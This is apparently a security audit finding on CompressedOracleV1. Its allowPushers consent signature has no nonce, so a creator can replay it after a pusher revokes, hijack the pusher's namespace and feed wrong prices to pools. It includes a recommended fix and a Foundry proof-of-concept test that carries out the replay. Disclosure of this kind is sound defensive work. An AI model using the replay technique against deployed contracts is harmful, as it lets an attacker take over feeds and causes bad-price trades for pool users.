### Title
`allowPushers` Delegation Signature Replay Bypasses Pusher Revocation, Enabling Namespace Hijack and Bad-Price Execution — (File: `smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`CompressedOracleV1.allowPushers` signs pusher consent over `(chainid, address(this), deadline, pusher, creator)` with no nonce. A creator who holds a valid, unexpired signature can replay it an unlimited number of times before the deadline, including **after the pusher has called `revokePusher()`**. This lets a creator silently re-establish a delegation the pusher explicitly cancelled, redirecting the pusher's future slot writes into the creator's namespace without the pusher's knowledge. If the pusher is simultaneously serving a different creator, that second creator's feeds are starved while the first creator's feeds receive data intended for the second — feeding wrong prices into any pool backed by those feeds.

---

### Finding Description

`allowPushers` builds its EIP-191 hash as:

```solidity
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
);
require(pusher == ECDSA.recover(hash, signatures[i]));
namespaceRemapping[pusher] = msg.sender;   // unconditional overwrite
``` [1](#0-0) 

There is no nonce and no "signature consumed" flag. The same `(deadline, pusher, creator)` tuple produces the same hash every time, so the same `bytes` signature passes `ECDSA.recover` on every call until `block.timestamp > deadline`.

The NatSpec comment on the function acknowledges the risk but misidentifies the deadline as the complete fix:

> *"The deadline is likewise required: the signed consent carries no timestamp of its own, so an undated signature could re-establish a delegation AFTER the pusher revoked it."* [2](#0-1) 

The deadline only bounds the replay window; it does not prevent replay within that window. `revokePusher` clears `namespaceRemapping[msg.sender]` to `address(0)`:

```solidity
function revokePusher() external {
    address creator = namespaceRemapping[msg.sender];
    if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
    namespaceRemapping[msg.sender] = address(0);
    emit PusherRevoked(msg.sender, creator);
}
``` [3](#0-2) 

But the creator can immediately call `allowPushers` again with the original signature (still valid until `deadline`) and overwrite `namespaceRemapping[pusher]` back to themselves. The pusher's revocation is silently undone.

The `fallback` push path resolves the namespace at call time:

```solidity
address creator = namespaceRemapping[msg.sender];
if (creator == address(0)) creator = msg.sender;
``` [4](#0-3) 

So every subsequent push by the pusher lands in the hijacked creator's namespace, not the pusher's own or a legitimately delegated second creator's namespace.

---

### Impact Explanation

`AnchoredPriceProvider._readLeg` calls `offchainOracle.price(feedId, pool)` and uses the returned `mid` and `spreadBps` to compute bid/ask for live pool swaps:

```solidity
(mid, spreadBps, , refTime) = IPricedOracle(address(offchainOracle)).price(feedId, msg.sender);
``` [5](#0-4) 

If the hijacked creator's feeds receive slot data that was intended for a different feed (e.g., a different asset pair pushed by the same pusher for creator B), the `mid` value returned is wrong. The `AnchoredPriceProvider` band clamp does not protect against a plausible-but-wrong mid — it only clips quotes that exceed the band derived from that same wrong mid. Pools executing swaps against this provider receive bad bid/ask prices, causing traders to receive more or less than the oracle-permitted amount (swap conservation failure / bad-price execution).

---

### Likelihood Explanation

The attack requires:
1. A pusher who previously signed a consent with a future deadline (normal operational practice).
2. The pusher subsequently calling `revokePusher()` (e.g., to move to a different creator).
3. The original creator replaying the old signature before the deadline.

Step 3 is a single permissionless transaction. The creator retains the original signature bytes off-chain indefinitely. No privileged role, no malicious setup, and no non-standard token is required. Any creator who received a pusher consent signature and later lost that pusher can exploit this.

---

### Recommendation

Add a per-pusher nonce to the signed message and increment it on every successful `allowPushers` call (or on every `revokePusher`/`removePushers` call). Alternatively, mark each signature as consumed with a `usedSignatures` mapping keyed on the full hash:

```solidity
mapping(bytes32 => bool) private _usedConsentHashes;

// inside allowPushers loop:
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
);
require(!_usedConsentHashes[hash], "signature already used");
require(pusher == ECDSA.recover(hash, signatures[i]));
_usedConsentHashes[hash] = true;
namespaceRemapping[pusher] = msg.sender;
```

This ensures each pusher consent signature is consumed exactly once, making `revokePusher` irrevocable by the creator without a fresh signature from the pusher.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {CompressedOracleV1} from "contracts/oracles/compressed/CompressedOracle.sol";
import {IOffchainOracle} from "contracts/interfaces/IOffchainOracle.sol";
import {U64x32} from "contracts/oracles/utils/U64x32.sol";

contract ReplayDelegationPoC is Test {
    CompressedOracleV1 oracle;

    uint256 constant CREATOR_KEY = 0xC0FFEE01;
    uint256 constant PUSHER_KEY  = 0xDEADBEEF;

    address creator;
    address pusher;

    function setUp() public {
        vm.warp(1_700_000_000);
        oracle  = new CompressedOracleV1(address(this), 0);
        creator = vm.addr(CREATOR_KEY);
        pusher  = vm.addr(PUSHER_KEY);
    }

    function _signConsent(uint256 key, uint256 deadline, address _pusher, address _creator)
        internal view returns (bytes memory)
    {
        bytes32 hash = keccak256(abi.encode(block.chainid, address(oracle), deadline, _pusher, _creator));
        bytes32 ethHash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", hash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(key, ethHash);
        return abi.encodePacked(r, s, v);
    }

    function _wordAt(uint8 slotId, uint8 pos, uint48 raw, uint56 tsMs)
        internal pure returns (bytes memory)
    {
        uint256 word = (uint256(tsMs) << 8) | uint256(slotId);
        word |= uint256(raw) << (208 - uint256(pos) * 48);
        return abi.encodePacked(word);
    }

    function test_replayAfterRevoke() public {
        uint256 deadline = block.timestamp + 30 days;

        // 1. Pusher signs consent for creator A
        bytes memory sig = _signConsent(PUSHER_KEY, deadline, pusher, creator);

        address[] memory pushers = new address[](1);
        pushers[0] = pusher;
        bytes[] memory sigs = new bytes[](1);
        sigs[0] = sig;

        // 2. Creator A establishes delegation
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs);
        assertEq(oracle.namespaceRemapping(pusher), creator);

        // 3. Pusher revokes
        vm.prank(pusher);
        oracle.revokePusher();
        assertEq(oracle.namespaceRemapping(pusher), address(0), "revocation should clear mapping");

        // 4. Creator A replays the SAME signature — no new consent from pusher
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs);  // succeeds!
        assertEq(oracle.namespaceRemapping(pusher), creator, "HIJACKED: mapping restored without pusher consent");

        // 5. Pusher's next push lands in creator A's namespace, not their own
        uint56 tsMs = uint56(block.timestamp * 1000);
        uint48 raw  = (uint48(1_234_567) << 16) | (uint48(3) << 8) | uint48(2);
        vm.prank(pusher);
        (bool ok,) = address(oracle).call(_wordAt(0, 0, raw, tsMs));
        assertTrue(ok);

        // Creator A's feed has the pusher's data
        IOffchainOracle.OracleData memory creatorData =
            oracle.getOracleData(oracle.feedIdOf(creator, 0, 0));
        assertGt(creatorData.price, 0, "creator A feed poisoned with pusher data");

        // Pusher's own namespace is empty
        IOffchainOracle.OracleData memory pusherData =
            oracle.getOracleData(oracle.feedIdOf(pusher, 0, 0));
        assertEq(pusherData.price, 0, "pusher own namespace empty — push was hijacked");
    }
}
```

### Citations

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L186-192)
```text
    /// @notice Delegates pusher wallets into the caller's namespace. The pusher's EIP-191
    ///         signature is REQUIRED — without it anyone could remap a foreign pusher
    ///         wallet into their own namespace and silently swallow its pushes. The
    ///         deadline is likewise required: the signed consent carries no timestamp of
    ///         its own, so an undated signature could re-establish a delegation AFTER the
    ///         pusher revoked it.
    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L204-209)
```text
            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L238-243)
```text
    function revokePusher() external {
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
        namespaceRemapping[msg.sender] = address(0);
        emit PusherRevoked(msg.sender, creator);
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L315-316)
```text
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0)) creator = msg.sender;
```

**File:** smart-contracts-poc/contracts/AnchoredPriceProvider.sol (L280-280)
```text
        (mid, spreadBps, , refTime) = IPricedOracle(address(offchainOracle)).price(feedId, msg.sender);
```
